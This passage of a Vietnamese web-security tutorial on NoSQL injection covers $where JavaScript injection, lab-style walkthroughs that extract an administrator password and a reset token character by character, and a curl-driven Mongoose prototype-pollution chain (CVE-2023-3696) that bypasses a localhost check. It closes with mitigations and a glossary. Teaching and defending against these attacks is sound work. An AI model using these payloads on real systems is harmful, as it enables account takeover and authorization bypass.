Đây là trường hợp các kỹ thuật `Object.keys(this)`, `this[Object.keys(this)[n]]`, hoặc `sleep(5000)` có chỗ để chạy, miễn là database evaluate `$where`.

Giới hạn thứ nhất: điều khiển được query object ở root không tự động đồng nghĩa với JavaScript execution. Nếu request chỉ dùng field operator:

```json
{"username":"administrator","password":{"$regex":"^p"}}
```

Query thật sự:

```js
{
  username: "administrator",
  password: { $regex: "^p" },
}
```

Payload này có thể dùng `$regex` trên `password`, nhưng chưa có JavaScript context. Nếu đặt JavaScript-looking string vào `$regex`:

```json
{"username":"administrator","password":{"$regex":"Object.keys(this)[1].match(/^p/)"}}
```

thì chuỗi `Object.keys(this)[1].match(/^p/)` vẫn chỉ là pattern regex, không phải expression được evaluate trên document.

Giới hạn thứ hai: backend có thể nhận nguyên object nhưng lọc bỏ `$where` trước khi query:

```js
app.post("/login", async (req, res) => {
  const { $where, ...query } = req.body;
  const user = await db.collection("users").findOne(query);

  res.status(user ? 200 : 401).send("Done");
});
```

Request:

```json
{"username":"administrator","password":{"$ne":"invalid"},"$where":"sleep(5000)"}
```

Query thật sự sau khi backend lọc:

```js
{
  username: "administrator",
  password: { $ne: "invalid" },
}
```

Ở đây các field operator như `$ne` hoặc `$regex` vẫn có thể còn tác dụng, nhưng `$where` không đi tới database. Vì vậy không dùng được JavaScript introspection và không tạo được delay chủ động bằng `sleep(5000)`.

Giới hạn thứ ba: có `$where` vẫn cần oracle. Backend có thể evaluate query nhưng trả response giống nhau cho điều kiện đúng và sai:

```js
app.post("/login", async (req, res) => {
  await db.collection("users").findOne(req.body);
  res.status(200).json({ message: "OK" });
});
```

Với code này, response body và status code không cho biết `$where` đúng hay sai. Extract field name hoặc field value chỉ còn khả thi nếu có timing oracle ổn định, ví dụ payload `$where` tạo delay có điều kiện và thời gian phản hồi đủ khác biệt so với baseline.

Tóm lại, Top-level query operator injection chỉ dùng được các kỹ thuật JavaScript khi cả ba điều kiện cùng đúng: `$where` ở root đi tới database, database evaluate `$where`, và response hoặc timing tạo oracle để phân biệt đúng/sai.

## 5. Case study

### 5.1. Luồng lab: hiển thị sản phẩm chưa released

Một lab điển hình dùng category filter được backed bởi MongoDB và vulnerable với NoSQL injection. Mục tiêu là làm ứng dụng hiển thị sản phẩm chưa released.

Luồng kiểm thử:

1. Chọn một product category và gửi request lọc category sang Repeater.
2. Gửi ký tự `'` trong `category`. Nếu xuất hiện JavaScript syntax error, input có thể chưa được filter hoặc sanitize đúng.
3. Gửi JavaScript payload hợp lệ:

```text
Gifts'+'
```

Nếu không còn syntax error, có thể đang có server-side injection.

4. So sánh false/true condition:

```text
Gifts' && 0 && 'x
```

```text
Gifts' && 1 && 'x
```

Nếu false condition không trả sản phẩm còn true condition vẫn trả sản phẩm trong `Gifts`, payload đã tác động đến query logic.

5. Gửi điều kiện luôn đúng:

```text
Gifts'||1||'
```

Response trong browser sẽ chứa sản phẩm chưa released nếu injection thành công.

### 5.2. Luồng lab: extract password qua user lookup

Một lab khác dùng chức năng user lookup backed bởi MongoDB. Mục tiêu là extract password của `administrator`, rồi login vào account đó. Account hợp lệ ban đầu là `wiener:peter`, và password mục tiêu chỉ dùng lowercase letters.

Luồng kiểm thử:

1. Login bằng `wiener:peter`.
2. Gửi request `GET /user/lookup?user=wiener` sang Repeater.
3. Gửi `'` trong `user`. Nếu response báo lỗi, input có thể chưa được sanitize đúng.
4. Gửi payload hợp lệ:

```text
wiener'+'
```

Nếu account detail của `wiener` vẫn được trả về, có dấu hiệu server-side injection.

5. So sánh false/true condition:

```text
wiener' && '1'=='2
```

```text
wiener' && '1'=='1
```

False condition trả `Could not find user`, còn true condition trả account detail, nghĩa là có thể dùng response để suy luận boolean.

6. Xác định password length:

```text
administrator' && this.password.length < 30 || 'a'=='b
```

Giảm dần giá trị length. Trong lab này, điều kiện với `9` trả detail của `administrator`, còn `8` trả lỗi, cho thấy password dài 8 ký tự.

7. Enumerate từng ký tự password bằng Intruder với Cluster bomb:

```text
administrator' && this.password[§0§]=='§a§
```

Position thứ nhất chạy từ `0` đến `7`; position thứ hai chạy từ `a` đến `z`. Những request có response đúng sẽ cho biết ký tự tại từng vị trí. Ghép các ký tự thu được để login vào `administrator`.

### 5.3. Luồng lab: extract unknown field và reset token

Một lab dùng login flow backed bởi MongoDB. Mục tiêu là login với user `carlos`. Để làm được điều này, cần extract password reset token của `carlos`.

Luồng kiểm thử:

1. Thử login với `carlos:invalid` và ghi nhận response `Invalid username or password`.
2. Gửi `POST /login` sang Repeater.
3. Đổi `password` từ `"invalid"` thành:

```json
{"$ne":"invalid"}
```

Nếu response chuyển thành `Account locked`, operator `$ne` đã được chấp nhận. Dù chưa truy cập được account, response này cho thấy ứng dụng vulnerable.

4. Ghi nhận giới hạn của hướng reset trực tiếp: flow reset password yêu cầu email verification, nên không thể đổi password chỉ bằng username. Vì vậy hướng kiểm thử chuyển sang tìm field reset token và token value.
5. Kiểm tra JavaScript injection bằng `$where`:

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"0"}
```

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
```

Nếu `"0"` trả `Invalid username or password` còn `"1"` trả `Account locked`, JavaScript trong `$where` đang được evaluate.

6. Dùng Intruder để xác định field trên user object:

```json
{"$where":"Object.keys(this)[1].match('^.{}.*')"}
```

Thêm hai payload positions để brute-force vị trí ký tự và ký tự:

```json
{"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"}
```

Position thứ nhất là số thứ tự ký tự, ví dụ `0` đến `20`. Position thứ hai gồm digits, lowercase letters, và uppercase letters. Sort kết quả theo vị trí và response length để phân biệt response `Account locked` với `Invalid username or password`. Các ký tự đúng ghép lại thành field name.

7. Lặp lại bằng cách tăng index trong `Object.keys(this)[n]` để tìm field khác:

```json
{"$where":"Object.keys(this)[2].match('^.{}.*')"}
```

Một trong các field tìm được là field chứa password reset token.

8. Kiểm tra field reset token trên endpoint reset password. Với field sai:

```http
GET /forgot-password?foo=invalid
```

Response giống request gốc. Với field token đã extract:

```http
GET /forgot-password?YOURTOKENNAME=invalid
```

Response `Invalid token` xác nhận đúng field name và endpoint.

9. Extract giá trị token bằng `$where`:

```json
{"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"}
```

Thay `YOURTOKENNAME` bằng field token đã tìm được. Dùng cùng kỹ thuật vị trí ký tự và ký tự thử để ghép token value.

10. Gửi token value vào endpoint reset:

```http
GET /forgot-password?YOURTOKENNAME=TOKENVALUE
```

Sau đó đổi password và login vào `carlos`.

### 5.4. Mongoose Prototype Pollution bypass localhost check

Case này ghép hai cơ chế:

- Prototype pollution (ô nhiễm prototype: ghi thuộc tính vào `Object.prototype`, khiến nhiều object khác kế thừa thuộc tính đó) trong Mongoose qua `findByIdAndUpdate()`.
- Node.js socket gadget (điểm đọc thuộc tính có thể bị ảnh hưởng bởi prototype pollution) dựa trên `_peername`, làm `req.connection.remoteAddress` trả về địa chỉ giả.

Chuỗi khai thác trong môi trường lab:

1. Tạo note với `title = "127.0.0.1"`.
2. Dùng `/update` với `$rename` để đổi `title` thành `__proto__._peername.address`.
3. Để chính route `/update` gọi `Note.find(...)` và kích hoạt prototype pollution.
4. Gọi `/flag`.
5. `req.connection.remoteAddress` resolve thành `127.0.0.1`, nên localhost check bị bypass.

CVE-2023-3696 ghi nhận Mongoose bị ảnh hưởng trong các dải version `>= 7.0.0, < 7.3.3`, `>= 6.0.0, < 6.11.3`, và `< 5.13.20`. Version `7.2.4` trong case này nằm trong vùng affected.

#### 5.4.1. Code mục tiêu

Ứng dụng Express/Mongoose rút gọn:

```js
const express = require("express");
const mongoose = require("mongoose");

const port = process.env.PORT ?? 3000;
const app = express();

const Note = mongoose.model("Note", new mongoose.Schema({
  title: String,
  content: String,
}));

app.use(express.static("public"));
app.use(express.json());

app.get("/flag", (req, res) => {
  const remoteAddress = req.connection.remoteAddress;

  if (
    remoteAddress === "127.0.0.1" ||
    remoteAddress === "::1" ||
    remoteAddress === "::ffff:127.0.0.1"
  ) {
    res.send(process.env.FLAG ?? "FLAG{fake_flag_for_testing}");
  } else {
    res.status(403).json({ Message: "Access denied" });
  }
});

app.post("/create", async (req, res) => {
  try {
    const { title, content } = req.body;

    if (typeof title !== "string" || typeof content !== "string") {
      res.status(400).json({ Message: "Invalid title or content" });
      return;
    }

    const note = new Note({ title, content });
    await note.save();
    res.json(note);
  } catch (error) {
    console.error(error);
    res.status(500).json({ Message: "An error occurred" });
  }
});

app.get("/get/:noteId", async (req, res) => {
  try {
    const noteId = req.params.noteId;
    const note = await Note.findOne({ _id: noteId });
    res.json(note);
  } catch (error) {
    console.error(error);
    res.status(500).json({ Message: "An error occurred" });
  }
});

app.post("/update", async (req, res) => {
  try {
    const { noteId } = req.body;

    await Note.findByIdAndUpdate(noteId, req.body);
    const result = await Note.find({ _id: noteId });

    res.json(result);
  } catch (error) {
    console.error(error);
    res.status(500).json({ Message: "An error occurred" });
  }
});

const main = async () => {
  try {
    await mongoose.connect("mongodb://localhost:27017/app");
    app.listen(port, () => {
      console.debug(`Server started on port ${port}`);
    });
  } catch (error) {
    console.error(error);
    process.exit(1);
  }
};

main();
```

Dependency đáng chú ý:

```json
{
  "dependencies": {
    "express": "^4.18.2",
    "mongoose": "^7.2.4"
  }
}
```

#### 5.4.2. Bề mặt tấn công

Route `/create` chỉ cho tạo note với hai field string:

- `title`
- `content`

Route này không trực tiếp pollute prototype, nhưng nó cho phép chuẩn bị giá trị hợp lệ ban đầu để dùng ở bước sau.

Sink chính nằm ở `/update`:

```js
await Note.findByIdAndUpdate(noteId, req.body);
const result = await Note.find({ _id: noteId });
```

Vấn đề gồm hai phần:

- `req.body` được truyền thẳng vào `findByIdAndUpdate()`.
- Route gọi tiếp `find()` trên document vừa bị update.

Điều này tạo đủ chain:

- Write primitive (khả năng ghi dữ liệu vào vị trí có ích cho khai thác) qua `findByIdAndUpdate()`.
- Trigger primitive (hành động kích hoạt side effect của dữ liệu đã ghi) qua `Note.find(...)`.

#### 5.4.3. Root cause phía Mongoose

Trong vùng version affected, Mongoose có prototype pollution trong quá trình xử lý document update. Một PoC rút gọn cho cơ chế này:

```js
await Example.findByIdAndUpdate(example._id, {
  $rename: {
    hello: "__proto__.polluted",
  },
});

await Example.find();
```

Sau `find()`, object rỗng có thể kế thừa thuộc tính mới:

```js
const test = {};
console.log(test.polluted);
```

Ý nghĩa với case này:

- Không cần merge object phức tạp.
- Không cần `constructor.prototype.*`.
- Chỉ cần có một field hợp lệ chứa giá trị mong muốn.
- Dùng `$rename` đổi field đó sang path `__proto__.<gadget>`.
- Để route tự gọi `find()` và kích hoạt pollution.

#### 5.4.4. Vì sao gadget là `_peername.address`

Đích kiểm tra của route `/flag` là:

```js
const remoteAddress = req.connection.remoteAddress;
```

Trong Node.js HTTP, `req.connection` là cách gọi deprecated và về bản chất trỏ đến socket của request. Vì vậy biểu thức trên tương đương đọc:

```js
req.socket.remoteAddress;
```

`socket.remoteAddress` lấy địa chỉ peer từ peername object. Cơ chế nội bộ ưu tiên dùng `this._peername` nếu thuộc tính này đã có; nếu chưa có thì mới đi tiếp đến handle của socket.

Do đó gadget đúng không phải:

```js
Object.prototype.remoteAddress = "127.0.0.1";
```

mà là:

```js
Object.prototype._peername = { address: "127.0.0.1" };
```

Khi `socket.remoteAddress` đọc `_peername` qua prototype chain, giá trị `address` có thể trở thành `127.0.0.1`.

#### 5.4.5. Vì sao phải dùng `$rename`

Schema chỉ có:

```js
{
  title: String,
  content: String,
}
```

Route `/create` cũng ép `title` và `content` phải là string. Vì vậy cần một cách để:

- Tạo một string hợp lệ trong document.
- Chuyển giá trị đó vào path độc hại `__proto__._peername.address`.

`$rename` là primitive phù hợp vì nó đổi tên field hiện có sang path mới. Trong case này, `title` đang chứa `"127.0.0.1"`, rồi được đổi thành `__proto__._peername.address`.

#### 5.4.6. Attack chain hoàn chỉnh

Bước 1: tạo note mồi với `title` là địa chỉ localhost mà `/flag` chấp nhận:

```bash
curl -s http://TARGET:3000/create \
  -H "Content-Type: application/json" \
  -d '{"title":"127.0.0.1","content":"demo"}'
```

Mục tiêu là lưu chuỗi `"127.0.0.1"` vào một field hợp lệ trong MongoDB.

![Tạo note mồi với title là 127.0.0.1](/assets/img/nosql-injection/mongoose-prototype-pollution-create.png)

Bước 2: dùng `/update` để pollute prototype:

```bash
curl -s http://TARGET:3000/update \
  -H "Content-Type: application/json" \
  -d '{
    "noteId":"<NOTE_ID>",
    "$rename":{
      "title":"__proto__._peername.address"
    }
  }'
```

`findByIdAndUpdate()` đổi field từ `title` thành `__proto__._peername.address`. Ngay sau đó route gọi:

```js
const result = await Note.find({ _id: noteId });
```

Thao tác `find()` khởi tạo lại document và kích hoạt prototype pollution. Trạng thái logic sau bước này tương đương:

![Dùng $rename để đổi title thành __proto__._peername.address](/assets/img/nosql-injection/mongoose-prototype-pollution-update.png)

```js
Object.prototype._peername = { address: "127.0.0.1" };
```

Bước 3: gọi `/flag`:

```bash
curl -s http://TARGET:3000/flag
```

Route `/flag` đọc:

```js
const remoteAddress = req.connection.remoteAddress;
```

Do `req.connection` là socket và `remoteAddress` dựa vào peername object, giá trị đọc được có thể là `127.0.0.1`. Khi đó điều kiện localhost đúng:

```js
if (
  remoteAddress === "127.0.0.1" ||
  remoteAddress === "::1" ||
  remoteAddress === "::ffff:127.0.0.1"
) {
  res.send(process.env.FLAG);
}
```

Impact của case này là bypass authorization dựa trên localhost check và truy cập dữ liệu chỉ dành cho request nội bộ.

![Gọi /flag sau khi req.connection.remoteAddress bị resolve thành localhost](/assets/img/nosql-injection/mongoose-prototype-pollution-flag.png)

## 6. Mitigation

Cách phòng chống phụ thuộc vào NoSQL technology cụ thể, nên cần dựa trên security documentation của database đang dùng. Các guideline chung:

- Sanitize và validate user input bằng allowlist các ký tự được chấp nhận.
- Đưa user input vào query bằng parameterized queries thay vì nối trực tiếp input vào query string.
- Để ngăn operator injection, áp dụng allowlist cho các key được chấp nhận.
- Với CVE-2023-3696 trong Mongoose, dùng bản đã vá theo nhánh đang triển khai, chẳng hạn `7.3.3`, `6.11.3`, `5.13.20` hoặc mới hơn.

## 7. Glossary

- Query: truy vấn ứng dụng gửi đến database để đọc, lọc, hoặc thao tác dữ liệu.
- Document: đơn vị dữ liệu bán cấu trúc trong document store, thường biểu diễn bằng JSON/BSON/XML.
- Syntax injection: injection phá vỡ cú pháp query để chèn biểu thức mới.
- Operator injection: injection chèn query operator như `$ne`, `$where`, `$in`, `$regex` để thay đổi logic query.
- `$where`: MongoDB operator cho phép match document dựa trên JavaScript expression.
- `$ne`: operator so khớp giá trị không bằng giá trị chỉ định.
- `$in`: operator so khớp giá trị nằm trong một array chỉ định.
- `$regex`: operator so khớp bằng regular expression.
- Null character: ký tự null có thể làm một số xử lý bỏ qua phần dữ liệu đứng sau nó.
- Boolean condition: điều kiện trả về true hoặc false, thường được dùng để suy luận dữ liệu qua khác biệt response.
- Prototype pollution: lỗi cho phép ghi thuộc tính vào prototype chung, khiến object khác kế thừa thuộc tính do attacker kiểm soát.
- Gadget: đoạn logic hoặc điểm đọc thuộc tính có thể biến prototype pollution thành impact thực tế.
- Write primitive: khả năng ghi dữ liệu vào vị trí cần thiết cho chuỗi khai thác.
- Trigger primitive: hành động làm dữ liệu đã ghi được xử lý và tạo side effect bảo mật.
